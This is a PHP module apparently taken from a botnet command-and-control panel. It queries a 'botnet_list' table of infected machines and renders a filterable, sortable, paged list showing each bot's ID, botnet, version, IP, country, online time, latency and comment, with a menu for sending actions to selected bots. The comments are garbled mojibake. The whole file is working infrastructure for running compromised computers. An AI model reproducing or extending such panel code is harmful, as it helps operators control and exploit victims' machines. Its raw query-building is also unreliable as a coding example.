<?php if(!defined('__CP__'))die();

define('BOTS_PER_PAGE',       50); //РљРѕР»РёС‡РµС‚СЃРІРѕ Р±РѕС‚РѕРІ РЅР° СЃС‚СЂР°РЅРёС†Сѓ.
define('BOTSLIST_ROWS_COUNT', 10); //РљРѕР»РёС‡РµС‚СЃРІРѕ СЃС‚РѕР»Р±С†РѕРІ РІ  СЃРїРёСЃРєРµ Р±РѕС‚РѕРІ.

$fullQuery = QUERY_STRING; //РЎС‚СЂРѕРєР° РїРѕР»РЅРѕРіРѕ Р·Р°РїСЂРѕСЃР°.

///////////////////////////////////////////////////////////////////////////////////////////////////
// РћРїСЂРµРґРµР»СЏРµРј РґР°РЅРЅС‹Рµ РґР»СЏ С„РёР»СЊС‚СЂР°.
///////////////////////////////////////////////////////////////////////////////////////////////////
$filter['bots']      = isset($_GET['bots'])      ? $_GET['bots']      : '';
$filter['botnets']   = isset($_GET['botnets'])   ? $_GET['botnets']   : '';
$filter['ips']       = isset($_GET['ips'])       ? $_GET['ips']       : '';
$filter['countries'] = isset($_GET['countries']) ? $_GET['countries'] : '';

$filter['nat']     = isset($_GET['nat'])     ? intval($_GET['nat'])     : 1;
$filter['online']  = isset($_GET['online'])  ? intval($_GET['online'])  : 1;
$filter['new']     = isset($_GET['new'])     ? intval($_GET['new'])     : 0;
$filter['used']    = isset($_GET['used'])    ? intval($_GET['used'])    : 0;
$filter['comment'] = isset($_GET['comment']) ? intval($_GET['comment']) : 0;

foreach($filter as $k => $i)$fullQuery .= '&'.$k.'='.urlencode($i);

///////////////////////////////////////////////////////////////////////////////////////////////////
// РћРїСЂРµРґРµР»СЏРµРј РґР°РЅРЅС‹Рµ С‚РµРєСѓС‰РµР№ СЃРѕСЂС‚РёСЂРѕРІРєРё.
///////////////////////////////////////////////////////////////////////////////////////////////////

$fullQuery .= assocateSortMode(array('bot_id', 'botnet', 'bot_version', 'ipv4', 'country', 'rtime_online', 'net_latency', 'comment'));
$jsSort = addJsSlashes($fullQuery);
$jsPage = addJsSlashes($fullQuery);

///////////////////////////////////////////////////////////////////////////////////////////////////
// JavaScript СЃРєСЂРёРїС‚С‹.
///////////////////////////////////////////////////////////////////////////////////////////////////

$jsScript = jsCheckAll('botslist', 'checkall', 'bots[]').
            jsSetSortMode($jsSort).
            "function changePage(p){window.location='{$jsPage}&page=' + p; return false;}";

///////////////////////////////////////////////////////////////////////////////////////////////////
// РЎРѕР·РґР°РЅРёРµ Р·Р°РїСЂРѕСЃР°.
///////////////////////////////////////////////////////////////////////////////////////////////////
/*
  РљР°СЃР°С‚РµР»СЊРЅРѕ LOCATE(`ipv4`, `ipv4_list`). РЎРїРѕСЃРѕР± РёРјРµРµС‚ РґРѕСЃС‚Р°С‚РѕС‡РЅРѕ Р·Р°РјРµС‚РЅС‹Р№ РєРѕСЃСЏРє, РЅРѕ Р·Р°РґСѓРјС‹РІР°СЏСЃСЊ
  Рѕ С…РѕС‚СЊ РєР°РєРѕРј-С‚Рѕ РІС‹РёРіСЂР°С€Рµ РІ СЃРєРѕСЂРѕСЃС‚Рё, РЅРµ РґСѓРјР°СЋ С‡С‚Рѕ РµРіРѕ СЃС‚РѕРёС‚ Р»РµС‡РёС‚СЊ... РЇ РґСѓРјР°СЋ РІРµСЂРѕСЏС‚РЅРѕСЃС‚СЊ РІСЃС‚СЂРµС‚РёС‚СЊ
  С‚Р°РєРѕРіРѕ СЃСѓСЂРѕРІРѕРіРѕ СЃРѕРІРїР°РґРµРЅРёСЏ РІ РґРёРєРѕРј РёРЅС‚РµСЂРЅРµС‚Рµ РѕС‡РµРЅСЊ РЅРёР·РєР°. Р•С‰Рµ РјРѕР¶РЅРѕ РїРѕРїСЂРѕР±С‹РІР°С‚СЊ РґРµР»РёС‚СЊ РїРѕ РјРѕРґСѓР»СЋ
  РЅР° 4... Р§С‚Рѕ РїСЂРёРІРµРґРµС‚ Рє РїСЂРѕС‚РёРІРѕРїРѕР»РѕР¶РЅРѕРјСѓ РєРѕСЃСЏРєСѓ...
*/
$q = array();
if($filter['nat'] > 0)    $q[] = "LOCATE(`ipv4`, `ipv4_list`)".($filter['nat'] == 1 ? '>' : '=')."0";
if($filter['new'] > 0)    $q[] = "`flag_new`=".($filter['new'] == 1 ? 1 : 0);
if($filter['used'] > 0)   $q[] = "`flag_used`=".($filter['used'] == 1 ? 1 : 0);
if($filter['online'] > 0) $q[] = "`rtime_last`".($filter['online'] == 1 ? '>=' : '<').ONLINE_TIME_MIN;
if($filter['comment'] > 0)$q[] = "LENGTH(`comment`)".($filter['comment'] == 1 ? '>' : '=')."0";

$q[] = expressionToSql($filter['bots'],      '`bot_id`',  0, 1);
$q[] = expressionToSql($filter['botnets'],   '`botnet`',  0, 1);
$q[] = expressionToSql($filter['ips'],       'CONCAT_WS(\'.\', ORD(SUBSTRING(`ipv4`, 1, 1)), ORD(SUBSTRING(`ipv4`, 2, 1)), ORD(SUBSTRING(`ipv4`, 3, 1)), ORD(SUBSTRING(`ipv4`, 4, 1)))',  0, 1); //Р­С‚Рѕ СѓР¶Р°СЃРЅРѕ.
$q[] = expressionToSql($filter['countries'], '`country`', 0, 1);

//Р§РёСЃС‚РёРј РјР°СЃСЃРёРІ.
foreach($q as $k => $v)if($v == '')unset($q[$k]);

$query1 = count($q) > 0 ? 'WHERE '.implode(' AND ', $q) : '';
$query2 = $query1.' ORDER BY '.$_sortColumn.($_sortOrder == 0 ? ' ASC' : ' DESC');
if($_sortColumnId != 0)$query2 .= ', `bot_id`'.($_sortOrder == 0 ? ' ASC' : ' DESC');
unset($q);

///////////////////////////////////////////////////////////////////////////////////////////////////
// Р’С‹РІРѕРґ СЃРїРёСЃРєР°.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Р”Р°РЅРЅС‹Рµ Рѕ СЃС‚СЂР°РЅРёС†Рµ.
$curPage   = (!empty($_GET['page']) && is_numeric($_GET['page']) ? $_GET['page'] : 1);
$pageCount = 0;
$pageList  = '';
$botsCount = 0;

//Р—Р°РїСЂРѕСЃ 1.
$r = mysqlQueryEx('botnet_list', 'SELECT COUNT(*) FROM `botnet_list` '.$query1);
if(($mt = @mysql_fetch_row($r)))
{
  //РЎРѕР·РґР°РЅРёРµ СЃРїРёСЃРєР° СЃС‚СЂР°РЅРёС†.
  if(($pageCount = ceil($mt[0] / BOTS_PER_PAGE)) > 1)
  {
    $pageList = 
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
        showPageList($pageCount, $curPage, 'return changePage({P})').
      THEME_DIALOG_ITEM_CHILD_END.
    THEME_DIALOG_ROW_END;
  }
  $botsCount = $mt[0];
}

//Р—Р°РїСЂРѕСЃ 2.
$botsList = '';
$offset = (($curPage - 1) * BOTS_PER_PAGE);
if(!$r ||
   !($r = mysqlQueryEx('botnet_list', 'SELECT `bot_id`, `botnet`, `bot_version`, LOCATE(`ipv4`, `ipv4_list`), `ipv4`, `country`, `rtime_online`, IF(`rtime_last`>='.ONLINE_TIME_MIN.', 1, 0), `net_latency`, `comment` FROM `botnet_list` '.$query2.' LIMIT '.$offset.', '.BOTS_PER_PAGE)) ||
   @mysql_affected_rows() === 0)
{
  $botsList .=
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(BOTSLIST_ROWS_COUNT, $r ? LNG_BOTNET_LIST_EMPTY : mysqlErrorEx()), THEME_LIST_ITEM_EMPTY_1).
  THEME_LIST_ROW_END;
}
//Р’С‹РІРѕРґ СЂРµР·СѓР»СЊС‚Р°С‚Р°.
else
{
  $i = 0;
  while(($mt = @mysql_fetch_row($r)))
  {
    //IPv4.
    $ipv4 = binaryIpToString($mt[4]);

    //РњРµС‚РєР° NAT.
    if($mt[3] == 0)$ipv4 .= '*';

    $themeText = $i % 2 ? THEME_LIST_ITEM_LTEXT_U2            : THEME_LIST_ITEM_LTEXT_U1;
    $themeNum  = $i % 2 ? THEME_LIST_ITEM_RTEXT_U2            : THEME_LIST_ITEM_RTEXT_U1;
    $themeCb   = $i % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1;

    $botsList .=
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('bots[]', htmlEntitiesEx($mt[0]), ''),                              $themeCb).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', numberFormatAsInt(++$offset)),                                             $themeNum).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', botPopupMenu($mt[0], 'botmenu')),                                          $themeText).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($mt[1])),                                                   $themeText).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', intToVersion($mt[2])),                                                     $themeText).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $ipv4),                                                                    $themeText).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($mt[5])),                                                   $themeText).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $mt[7] == 1 ? tickCountToText(CURRENT_TIME - $mt[6]) : LNG_FORMAT_NOTIME), $themeNum).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', numberFormatAsFloat($mt[8] / 1000, 3)),                                    $themeNum).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($mt[9]) ? '-' : htmlEntitiesEx($mt[9])),                             $themeText).
    THEME_LIST_ROW_END;  
    
    $i++;
  }
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// РЎРѕР·РґР°РЅРёРµ СЃРїРёСЃРѕРєР° РґРµР№С‚РІРёР№.
///////////////////////////////////////////////////////////////////////////////////////////////////

$actions = '';
if($pageCount > 0 && count($botMenu) > 0)
{
  $data = LNG_BOTNET_BOTSACTION.THEME_STRING_SPACE.str_replace(array('{NAME}', '{WIDTH}'), array('botsaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN);
  foreach($botMenu as $item)$data .= str_replace(array('{VALUE}', '{TEXT}'), array($item[0], $item[1]), THEME_DIALOG_ITEM_LISTBOX_ITEM);
  $data .= THEME_DIALOG_ITEM_LISTBOX_END.THEME_STRING_SPACE.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT);
  $actions = THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $data, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END;
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Р’С‹РІРѕРґ.
///////////////////////////////////////////////////////////////////////////////////////////////////
define('INPUT_WIDTH',  '250px'); //РЁРёСЂРёРЅР° input.text.
define('SELECT_WIDTH', '150px'); //РЁРёСЂРёРЅР° select.

ThemeBegin(LNG_BOTNET, $jsScript, getBotJsMenu('botmenu'), 0);
echo

//Р¤РёР»СЊС‚СЂ.
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('filter', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_BEGIN).
  FORM_CURRENT_MODULE.
  str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_TITLE), THEME_DIALOG_TITLE).
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_BOTS, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'bots',      htmlEntitiesEx($filter['bots']),      512), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_BOTNETS, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'botnets',   htmlEntitiesEx($filter['botnets']),   512), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_IPS, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'ips',       htmlEntitiesEx($filter['ips']),       512), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_COUNTRIES, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'countries', htmlEntitiesEx($filter['countries']), 512), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
      THEME_DIALOG_GROUP_END.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_NAT, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('nat', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL),         $filter['nat'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_NAT_OUTSIDE), $filter['nat'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_NAT_INSIDE),  $filter['nat'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_ONLINE, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('online', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL),            $filter['online'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_ONLINE_ONLINE),  $filter['online'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_ONLINE_OFFLINE), $filter['online'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_NEW, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('new', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL),       $filter['new'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_NEW_TRUE),  $filter['new'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_NEW_FALSE), $filter['new'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_USED, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('used', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL),        $filter['used'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_USED_TRUE),  $filter['used'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_USED_FALSE), $filter['used'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_FILTER_COMMENT, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('comment', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL),           $filter['comment'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_COMMENT_TRUE),  $filter['comment'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_COMMENT_FALSE), $filter['comment'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
      THEME_DIALOG_GROUP_END.
    THEME_DIALOG_ROW_END.
    str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
      str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BOTNET_FILTER_RESET, ''), THEME_DIALOG_ITEM_ACTION_RESET).
      THEME_STRING_SPACE.
      str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BOTNET_FILTER_SUBMIT, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
    THEME_DIALOG_ACTIONLIST_END.
  THEME_DIALOG_END.
  addSortModeToForm().
THEME_FORMGET_END.

THEME_VSPACE.

//Р РµР·СѓР»СЊС‚Р°С‚.
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('botslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN).
str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1,  sprintf(LNG_BOTNET_LIST, numberFormatAsInt($botsCount))), THEME_DIALOG_TITLE).
  $pageList.
  $actions.
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
      str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="checkAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, '#', 'auto'),                                                              THEME_LIST_HEADER_R).
          writeSortColumn(LNG_BOTNET_LIST_BOTID,      0, 0).
          writeSortColumn(LNG_BOTNET_LIST_BOTNET,     1, 0).
          writeSortColumn(LNG_BOTNET_LIST_VERSION,    2, 0).
          writeSortColumn(LNG_BOTNET_LIST_IPV4,       3, 0).
          writeSortColumn(LNG_BOTNET_LIST_CONTRY,     4, 0).
          writeSortColumn(LNG_BOTNET_LIST_ONLINETIME, 5, 1).
          writeSortColumn(LNG_BOTNET_LIST_LATENCY,    6, 1).
          writeSortColumn(LNG_BOTNET_LIST_COMMENT,    7, 0).
        THEME_LIST_ROW_END.
        $botsList.
      THEME_LIST_END.
    THEME_DIALOG_ITEM_CHILD_END.
  THEME_DIALOG_ROW_END.
THEME_DIALOG_END.
THEME_FORMGET_END;
ThemeEnd();
die();
?>